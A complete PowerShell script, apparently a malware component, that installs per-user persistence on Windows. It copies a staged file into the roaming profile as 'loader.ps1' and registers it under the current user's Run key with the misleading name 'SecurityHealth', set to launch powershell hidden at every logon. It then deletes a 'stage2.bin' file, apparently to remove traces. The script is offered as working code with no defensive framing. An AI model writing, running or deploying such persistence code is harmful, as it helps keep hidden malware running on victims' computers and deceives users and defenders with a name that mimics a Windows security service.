<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$RegistryValue = 'SecurityHealth'
$PersistencePath = "$env:APPDATA\loader.ps1"
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Installing per-user persistence"
    if (-not (Test-Path -Path $PersistencePath)) {
        Copy-Item -Path "$env:TEMP\update.dat" -Destination $PersistencePath -Force
    }
    New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $PersistencePath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    $OperationResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue -ErrorAction SilentlyContinue
    Write-Verbose ("Registered value: " + $OperationResult.$RegistryValue)
}
catch {
    Write-Warning "Run-key installation failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
